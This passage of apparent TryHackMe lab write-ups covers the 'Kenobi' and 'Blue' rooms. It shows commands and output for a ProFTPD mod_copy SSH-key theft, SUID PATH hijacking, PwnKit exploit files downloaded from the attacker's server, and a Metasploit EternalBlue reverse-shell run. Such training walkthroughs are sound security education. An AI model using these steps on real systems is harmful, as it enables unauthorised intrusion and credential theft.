o ..o.o+.@oo | | . . . E .O+= . | | . . oBo. | +----[SHA256]-----+ # This is a basic ProFTPD configuration file (rename it to # \u0026#39;proftpd.conf\u0026#39; for actual use. It establishes a single server # and a single anonymous login. It assumes that you have a user/group # \u0026#34;nobody\u0026#34; and \u0026#34;ftp\u0026#34; for normal operation and anon. ServerName\t\u0026#34;ProFTPD Default Installation\u0026#34; ServerType\tstandalone DefaultServer\ton # Port 21 is the standard FTP port. Port\t21 On the port 111 we see there is rpcbind service running and in the rpcinfo we can see that nfs service is running. So, let\u0026rsquo;s enumerate for nfs shares and from the mount information we can see the mount /var.\nnmap -p 111 -script=nfs-ls,nfs-statfs,nfs-showmount 10.10.112.104 ❯ nmap -p 111 -script=nfs-ls,nfs-statfs,nfs-showmount 10.10.112.104 Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-25 00:53 EDT Nmap scan report for 10.10.112.104 Host is up (0.12s latency). PORT STATE SERVICE 111/tcp open rpcbind | nfs-showmount: |_ /var * | nfs-ls: Volume /var | access: Read Lookup NoModify NoExtend NoDelete NoExecute | PERMISSION UID GID SIZE TIME FILENAME | rwxr-xr-x 0 0 4096 2019-09-04T08:53:24 . | rwxr-xr-x 0 0 4096 2019-09-04T12:27:33 .. | rwxr-xr-x 0 0 4096 2019-09-04T12:09:49 backups | rwxr-xr-x 0 0 4096 2019-09-04T10:37:44 cache | rwxrwxrwt 0 0 4096 2019-09-04T08:43:56 crash | rwxrwsr-x 0 50 4096 2016-04-12T20:14:23 local | rwxrwxrwx 0 0 9 2019-09-04T08:41:33 lock | rwxrwxr-x 0 108 4096 2019-09-04T10:37:44 log | rwxr-xr-x 0 0 4096 2019-01-29T23:27:41 snap | rwxr-xr-x 0 0 4096 2019-09-04T08:53:24 www |_ | nfs-statfs: | Filesystem 1K-blocks Used Available Use% Maxfilesize Maxlink |_ /var 9204224.0 1737356.0 6976272.0 20% 16.0T 32000 Nmap done: 1 IP address (1 host up) scanned in 2.11 seconds We saw there is a ftp service running on port 21. We found that the ftp version is 1.3.5.\nWe will use searchsploit to find for any vulnerabilities present in the 1.3.5 version of ProFTPd.\nsearchsploit proftpd 1.3.5 While looking for the vulnerabilities for the proftpd version 1.3.5, we found that there is a vulnerability that exploits SITE CPFR/CPTO commands.\n❯ searchsploit proftpd 1.3.5 --------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- ProFTPd 1.3.5 - \u0026#39;mod_copy\u0026#39; Command Execution (Metasploit) | linux/remote/37262.rb ProFTPd 1.3.5 - \u0026#39;mod_copy\u0026#39; Remote Command Execution | linux/remote/36803.py ProFTPd 1.3.5 - \u0026#39;mod_copy\u0026#39; Remote Command Execution (2) | linux/remote/49908.py ProFTPd 1.3.5 - File Copy | linux/remote/36742.txt --------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Exploitation # Using this we can copy files in the target. So, we will copy the id_rsa file to the /var directory and then mount the /var directory to our machine.\nLet\u0026rsquo;s connect to ftp and copy the files.\nnc 10.10.112.104 21 SITE CPFR /home/kenobi/.ssh/id_rsa SITE CPTO /var/tmp/id_rsa http://www.proftpd.org/docs/contrib/mod_copy.html\nSITE CPFR This SITE command specifies the source file/directory to use for copying from one place to another directly on the server. The syntax for SITE CPFR is: SITE CPFR source-path SITE CPTO This SITE command specifies the destination file/directory to use for copying from one place to another directly on the server. The syntax for SITE CPTO is: SITE CPTO destination-path A client wishing to copy a file/directory first sends a SITE CPFR command, then a SITE CPTO; this is similar to how renames are handled using RNFR and RNTO. Use of these SITE command can be controlled via \u0026lt;Limit\u0026gt; sections, e.g.: \u0026lt;Limit SITE_COPY\u0026gt; AllowUser alex DenyAll \u0026lt;/Limit\u0026gt; ❯ nc 10.10.112.104 21 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.112.104] SITE CPFR /home/kenobi/.ssh/id_rsa 350 File or directory exists, ready for destination name SITE CPTO /var/tmp/id_rsa 250 Copy successful Now we will mount the /var directory to our machine.\nmkdir /mnt/kenobi mount 10.10.112.104:/var /mnt/kenobi cd /mnt/kenobi ❯ mkdir /mnt/kenobi ❯ mount 10.10.112.104:/var /mnt/kenobi ❯ cd /mnt/kenobi ❯ ls -la total 56 drwxr-xr-x 14 root root 4096 Sep 4 2019 . drwxr-xr-x 4 root root 4096 May 25 01:01 .. drwxr-xr-x 2 root root 4096 Sep 4 2019 backups drwxr-xr-x 9 root root 4096 Sep 4 2019 cache drwxrwxrwt 2 root root 4096 Sep 4 2019 crash drwxr-xr-x 40 root root 4096 Sep 4 2019 lib drwxrwsr-x 2 root staff 4096 Apr 12 2016 local lrwxrwxrwx 1 root root 9 Sep 4 2019 lock -\u0026gt; /run/lock drwxrwxr-x 10 root tss 4096 Sep 4 2019 log drwxrwsr-x 2 root mail 4096 Feb 26 2019 mail drwxr-xr-x 2 root root 4096 Feb 26 2019 opt lrwxrwxrwx 1 root root 4 Sep 4 2019 run -\u0026gt; /run drwxr-xr-x 2 root root 4096 Jan 29 2019 snap drwxr-xr-x 5 root root 4096 Sep 4 2019 spool drwxrwxrwt 6 root root 4096 May 25 01:00 tmp drwxr-xr-x 3 root root 4096 Sep 4 2019 www ❯ cd tmp/ ❯ ls -la total 28 drwxrwxrwt 6 root root 4096 May 25 01:00 . drwxr-xr-x 14 root root 4096 Sep 4 2019 .. -rw-r--r-- 1 kali kali 1675 May 25 01:00 id_rsa drwx------ 3 root root 4096 May 25 00:43 systemd-private-1e920d8729fd40e9bedb6b724b8b7e62-systemd-timesyncd.service-HJEhTc drwx------ 3 root root 4096 Sep 4 2019 systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM drwx------ 3 root root 4096 Sep 4 2019 systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw drwx------ 3 root root 4096 Sep 4 2019 systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn root@kali /mnt/kenobi/tmp ❯ We can see the file, we will copy it to our machine and change the permissions for the file. Now ssh into the target as user kenobi.\nchmod 600 id_rsa ssh kenobi@10.10.112.104 -i id rsa ❯ ssh kenobi@10.10.112.104 -i id_rsa Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 103 packages can be updated. 65 updates are security updates. Last login: Wed Sep 4 07:10:15 2019 from 192.168.1.147 To run a command as administrator (user \u0026#34;root\u0026#34;), use \u0026#34;sudo \u0026lt;command\u0026gt;\u0026#34;. See \u0026#34;man sudo_root\u0026#34; for details. kenobi@kenobi:~$ kenobi@kenobi:~$ id uid=1000(kenobi) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare) We\u0026rsquo;re logged in as kenobi.\nPrivilege Escalation # Approach 1 # We will find the files with SUID bit set.\nfind / -perm -u=s -type f 2\u0026gt;/dev/null kenobi@kenobi:~$ find / -perm -u=s -type f 2\u0026gt;/dev/null /sbin/mount.nfs /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/snapd/snap-confine /usr/lib/eject/dmcrypt-get-device /usr/lib/openssh/ssh-keysign /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic /usr/bin/chfn /usr/bin/newgidmap /usr/bin/pkexec /usr/bin/passwd /usr/bin/newuidmap /usr/bin/gpasswd /usr/bin/menu /usr/bin/sudo /usr/bin/chsh /usr/bin/at /usr/bin/newgrp /bin/umount /bin/fusermount /bin/mount /bin/ping /bin/su /bin/ping6 /usr/bin/menu seems to be unusual among the list of file that we got.\nWhen we execute that binary, we can see a couple of commands that can be executed. We will now manipulate the PATH variable to get our root shell.\nkenobi@kenobi:~$ /usr/bin/menu *************************************** 1. status check 2. kernel version 3. ifconfig ** Enter your choice :1 HTTP/1.1 200 OK Date: Sat, 25 May 2024 05:09:29 GMT Server: Apache/2.4.18 (Ubuntu) Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT ETag: \u0026#34;c8-591b6884b6ed2\u0026#34; Accept-Ranges: bytes Content-Length: 200 Vary: Accept-Encoding Content-Type: text/html When we used the first command to test what that does, we can see it is using curl to run the status check. Now, we will replace the functionality of the curl command in the status check with the /bin/sh and add it to the path so that we can get the shell as soon it gets executed.\nkenobi@kenobi:~$ cd /tmp/ kenobi@kenobi:/tmp$ echo /bin/sh \u0026gt; curl kenobi@kenobi:/tmp$ chmod 777 curl kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH kenobi@kenobi:/tmp$ /usr/bin/menu *************************************** 1. status check 2. kernel version 3. ifconfig ** Enter your choice :1 # id uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare) # We are root!!!\nApproach 2 # Start the python http server and download linpeas.sh to the target machine.\npython -m http.server 1111 On target machine\nwet http: //10.6.29.149:1111/linpeas.sh Change the file permissions to executable and run the file.\nchmod +x linpeas.sh ./linpeas.sh kenobi@kenobi:/tmp$ wget http://10.6.10.164/linpeas.sh --2024-05-25 00:13:03-- http://10.6.10.164/linpeas.sh Connecting to 10.6.10.164:80... connected. HTTP request sent, awaiting response... 200 OK Length: 847825 (828K) [text/x-sh] Saving to: ‘linpeas.sh’ linpeas.sh 100%[===================================================================================================\u0026gt;] 827.95K 1.13MB/s in 0.7s 2024-05-25 00:13:04 (1.13 MB/s) - ‘linpeas.sh’ saved [847825/847825] kenobi@kenobi:/tmp$ chmod +x linpeas.sh kenobi@kenobi:/tmp$ ./linpeas.sh ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄ ▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄ ▄▄ ▄▄▄ ▄▄▄▄▄ ▄▄▄ ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄ ▄ ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄ ▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄ ▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▀▀▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀ ▀▀▀▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▀▀ ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀ /---------------------------------------------------------------------------------\\ | Do you like PEASS? | |---------------------------------------------------------------------------------| | Get the latest version : https://github.com/sponsors/carlospolop | | Follow on Twitter : @hacktricks_live | | Respect on HTB : SirBroccoli | |---------------------------------------------------------------------------------| | Thank you! | \\---------------------------------------------------------------------------------/ linpeas-ng by carlospolop We can see that the target machine is vulnerable to CVE-2021-4034.\n[+] [CVE-2021-4034] PwnKit Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt Exposure: probable Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main We clone the repository to our machine.\nhttps://github.com/ryaagard/CVE-2021-4034.git\nStart the python server again to server the files.\npython -m http.server 1111 On target machine create a folder and download all the files to the machine.\nkenobi@kenobi:/tmp$ mkdir exploit kenobi@kenobi:/tmp$ cd exploit/ kenobi@kenobi:/tmp/exploit$ wget http://10.6.10.164/evil-so.c --2024-05-25 00:28:30-- http://10.6.10.164/evil-so.c Connecting to 10.6.10.164:80... connected. HTTP request sent, awaiting response... 200 OK Length: 183 [text/x-csrc] Saving to: ‘evil-so.c’ evil-so.c 100%[===================================================================================================\u0026gt;] 183 --.-KB/s in 0s 2024-05-25 00:28:30 (47.8 MB/s) - ‘evil-so.c’ saved [183/183] kenobi@kenobi:/tmp/exploit$ wget http://10.6.10.164/exploit.c --2024-05-25 00:28:46-- http://10.6.10.164/exploit.c Connecting to 10.6.10.164:80... connected. HTTP request sent, awaiting response... 200 OK Length: 614 [text/x-csrc] Saving to: ‘exploit.c’ exploit.c 100%[===================================================================================================\u0026gt;] 614 --.-KB/s in 0s 2024-05-25 00:28:47 (139 MB/s) - ‘exploit.c’ saved [614/614] kenobi@kenobi:/tmp/exploit$ wget http://10.6.10.164/Makefile --2024-05-25 00:29:03-- http://10.6.10.164/Makefile Connecting to 10.6.10.164:80... connected. HTTP request sent, awaiting response... 200 OK Length: 148 [application/octet-stream] Saving to: ‘Makefile’ Makefile 100%[===================================================================================================\u0026gt;] 148 --.-KB/s in 0s 2024-05-25 00:29:04 (31.5 MB/s) - ‘Makefile’ saved [148/148] Run the make file.\nkenobi@kenobi:/tmp/exploit$ make gcc -shared -o evil.so -fPIC evil-so.c evil-so.c: In function ‘gconv_init’: evil-so.c:10:5: warning: implicit declaration of function ‘setgroups’ [-Wimplicit-function-declaration] setgroups(0); ^ evil-so.c:12:5: warning: null argument where non-null required (argument 2) [-Wnonnull] execve(\u0026#34;/bin/sh\u0026#34;, NULL, NULL); ^ gcc exploit.c -o exploit exploit.c: In function ‘main’: exploit.c:25:5: warning: implicit declaration of function ‘execve’ [-Wimplicit-function-declaration] execve(BIN, argv, envp); ^ Execute the binary.\nkenobi@kenobi:/tmp/exploit$ ls evil.so evil-so.c exploit exploit.c Makefile kenobi@kenobi:/tmp/exploit$ ./e -bash: ./e: No such file or directory kenobi@kenobi:/tmp/exploit$ ./exploit # id uid=0(root) gid=0(root) groups=0(root) We are root!!!\n"},{"id":10,"href":"/posts/Blue/","title":"Blue","section":"Blog","content":" Deploy \u0026amp; hack into a Windows machine, leveraging common misconfigurations issues.\nhttps://tryhackme.com/r/room/blue\nScanning # Scan the machine for open ports and vulnerabilities using nmap.\n❯ rustscan -a 10.10.162.1 -- -sVC .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-\u0026#39; `-\u0026#39;`-----\u0026#39;`----\u0026#39; `-\u0026#39; `----\u0026#39; `---\u0026#39; `-\u0026#39; `-\u0026#39;`-\u0026#39; `-\u0026#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- 🌍HACK THE PLANET🌍 [~] The config file is expected to be at \u0026#34;/root/.rustscan.toml\u0026#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan\u0026#39;s speed. Use the Docker image, or up the Ulimit with \u0026#39;--ulimit 5000\u0026#39;. Open 10.10.162.1:135 Open 10.10.162.1:139 Open 10.10.162.1:445 Open 10.10.162.1:3389 Open 10.10.162.1:49152 Open 10.10.162.1:49154 Open 10.10.162.1:49153 Open 10.10.162.1:49159 Open 10.10.162.1:49158 [~] Starting Script(s) [\u0026gt;] Running script \u0026#34;nmap -vvv -p {{port}} {{ip}} -sVC\u0026#34; on ip 10.10.162.1 Depending on the complexity of the script, results may take some time to appear. [~] Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-24 18:21 EDT NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 18:21 Completed NSE at 18:21, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 18:21 Completed NSE at 18:21, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 18:21 Completed NSE at 18:21, 0.00s elapsed Initiating Ping Scan at 18:21 Scanning 10.10.162.1 [4 ports] Completed Ping Scan at 18:21, 0.15s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 18:21 Completed Parallel DNS resolution of 1 host. at 18:21, 0.04s elapsed DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0] Initiating SYN Stealth Scan at 18:21 Scanning 10.10.162.1 [9 ports] Discovered open port 135/tcp on 10.10.162.1 Discovered open port 445/tcp on 10.10.162.1 Discovered open port 139/tcp on 10.10.162.1 Discovered open port 3389/tcp on 10.10.162.1 Discovered open port 49159/tcp on 10.10.162.1 Discovered open port 49152/tcp on 10.10.162.1 Discovered open port 49158/tcp on 10.10.162.1 Discovered open port 49153/tcp on 10.10.162.1 Discovered open port 49154/tcp on 10.10.162.1 Completed SYN Stealth Scan at 18:21, 0.16s elapsed (9 total ports) Initiating Service scan at 18:21 Scanning 9 services on 10.10.162.1 Service scan Timing: About 44.44% done; ETC: 18:23 (0:01:09 remaining) Completed Service scan at 18:22, 86.37s elapsed (9 services on 1 host) NSE: Script scanning 10.10.162.1. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 18:22 Completed NSE at 18:22, 5.82s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 18:22 Completed NSE at 18:22, 0.42s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 18:22 Completed NSE at 18:22, 0.00s elapsed Nmap scan report for 10.10.162.1 Host is up, received echo-reply ttl 125 (0.12s latency). Scanned at 2024-05-24 18:21:03 EDT for 92s PORT STATE SERVICE REASON VERSION 135/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 125 Microsoft Windows netbios-ssn 445/tcp open microsoft-ds syn-ack ttl 125 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3389/tcp open ms-wbt-server? syn-ack ttl 125 |_ssl-date: 2024-05-24T22:22:35+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=Jon-PC | Issuer: commonName=Jon-PC | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2024-05-23T22:14:32 | Not valid after: 2024-11-22T22:14:32 | MD5: 629ad470ab4e21a9c813d65ab304115f | SHA-1: 993099d4405a6dfab9f6c525bd1ae3e3303c8d9c | -----BEGIN CERTIFICATE----- | MIIC0DCCAbigAwIBAgIQfNA0SBpvGoJLfiNM2PSHGDANBgkqhkiG9w0BAQUFADAR | MQ8wDQYDVQQDEwZKb24tUEMwHhcNMjQwNTIzMjIxNDMyWhcNMjQxMTIyMjIxNDMy | WjARMQ8wDQYDVQQDEwZKb24tUEMwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK | AoIBAQDsV5bZ4x4asKFHMR0OI3UTMugwb/0dVzp6WfkpNtFtW0Yjktq1uyqTrbHh | jeTCeLQgYs9CU7MQazj4K6ffIv2Ve0pFKlTKXsgWbGEDzTqUKnOWioP5rrClo5b9 | BX6SIEVgiKzr0EUZss94gezW8RWMVmOcSlMkPwBlvxUmHkfRhOCf9XptEejTMxpV | fDC8hvAOl2YQmBLiNwrYHvDT32xUwzFyC9T6IXSD8no3sg7eaJHbCWBgNU+8rTq5 | h+8tSuJTtTa7w0axS5+T6jRr0P3NjPLGbC0jh7ZG8/+myqZwvIV9g8DB/JjBoOD2 | XAYPCqADeX9t7gWUrYPyu+99srP7AgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUF | BwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQUFAAOCAQEAIXknfD0u0S0InIoL | EnHxSkF6nkU0xYluo0yIT0J85WAh2XJZhbN51h8wI5zgFbyDhNQITLX0tMwc3p2m | 2nCfM21t5o8VIgJOsM17x4uOqgVpm/egezHoUJEWoexVU4acLf/zZ0eUC6UAXmQk | ouW1jXiG21NWOmwpyAjN7Ixjm9NMGaPok7Y96d4u80wU9etLhDO4h1HLSd3DJEaL | YEpnweXMNg0IuaxJu9V2zykUQUal14bvv0LZNzkZsBD0dFuwJ1ReKVH+39dYUCgU | K8Z2Z2jBo0RcFH0uPBBJ112QTlaC69R2giMQuwERB3rFqmhC7W4k1alP9qfhWSAH | yqNL5g== |_-----END CERTIFICATE----- | rdp-ntlm-info: | Target_Name: JON-PC | NetBIOS_Domain_Name: JON-PC | NetBIOS_Computer_Name: JON-PC | DNS_Domain_Name: Jon-PC | DNS_Computer_Name: Jon-PC | Product_Version: 6.1.7601 |_ System_Time: 2024-05-24T22:22:29+00:00 49152/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49153/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49154/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49158/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49159/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: Jon-PC | NetBIOS computer name: JON-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2024-05-24T17:22:29-05:00 |_clock-skew: mean: 59m59s, deviation: 2h14m10s, median: -1s | nbstat: NetBIOS name: JON-PC, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 02291b084223 (unknown) | Names: | JON-PC\u0026lt;00\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;00\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | JON-PC\u0026lt;20\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;1e\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;1d\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | \\x01\\x02__MSBROWSE__\\x02\u0026lt;01\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | Statistics: | 02291b0842230000000000000000000000 | 0000000000000000000000000000000000 |_ 0000000000000000000000000000 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 210: |_ Message signing enabled but not required | smb2-time: | date: 2024-05-24T22:22:29 |_ start_date: 2024-05-24T22:14:25 | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 22780/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 2 (port 41456/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 3 (port 34046/udp): CLEAN (Timeout) | Check 4 (port 27211/udp): CLEAN (Failed to receive data) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 18:22 Completed NSE at 18:22, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 18:22 Completed NSE at 18:22, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 18:22 Completed NSE at 18:22, 0.00s elapsed Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 93.39 seconds Raw packets sent: 13 (548B) | Rcvd: 10 (424B) Running it again to check for vulnerabilities yields the following result.\nHost script results: |_smb-vuln-ms10-054: false |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED From the scan results we can see that the machine is vulnerable to ms17-010.\nExploitation # Let\u0026rsquo;s open metasploit.\nmsfconsole -q Search for the exploit ms17-010 and use exploit/windows/smb/ms17_010_eternalblue.\nsearch ms17-010 use 0 msf6 \u0026gt; search ms17-010 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 1 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 2 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 3 auxiliary/scanner/smb/smb_ms17_010 normal No MS17-010 SMB RCE Detection 4 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce msf6 \u0026gt; use 0 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; The payload is set by default to windows/x64/meterpreter/reverse tcp.\nSee the available options and change the rport and lhost.\nshow options set rhosts 10.10.162.1 set lhost tun0 Run the exploit.\nexploit msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; exploit [*] Started reverse TCP handler on 10.6.10.164:4444 [*] 10.10.162.1:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [+] 10.10.162.1:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.10.162.1:445 - Scanned 1 of 1 hosts (100% complete) [+] 10.10.162.1:445 - The target is vulnerable. [*] 10.10.162.1:445 - Connecting to target for exploitation. [+] 10.10.162.1:445 - Connection established for exploitation. [+] 10.10.162.1:445 - Target OS selected valid for OS indicated by SMB reply [*] 10.10.162.1:445 - CORE raw buffer dump (42 bytes) [*] 10.10.162.1:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes [*] 10.10.162.1:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv [*] 10.10.162.1:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1 [+] 10.10.162.1:445 - Target arch selected valid for arch indicated by DCE/RPC reply [*] 10.10.162.1:445 - Trying exploit with 17 Groom Allocations. [*] 10.10.162.1:445 - Sending all but last fragment of exploit packet [*] 10.10.162.1:445 - Starting non-paged pool grooming [+] 10.10.162.1:445 - Sending SMBv2 buffers [+] 10.10.162.1:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [*] 10.10.162.1:445 - Sending final SMBv2 buffers. [*] 10.10.162.1:445 - Sending last fragment of exploit packet! [*] 10.10.162.1:445 - Receiving response from exploit packet [+] 10.10.162.1:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [*] 10.10.162.1:445 - Sending egg to corrupted connection. [*] 10.10.162.1:445 - Triggering free of corrupted buffer. [*] Sending stage (200774 bytes) to 10.10.162.1 [*] Meterpreter session 1 opened (10.6.10.164:4444 -\u0026gt; 10.10.162.1:49213) at 2024-05-24 18:46:11 -0400 [+] 10.10.162.1:445 - 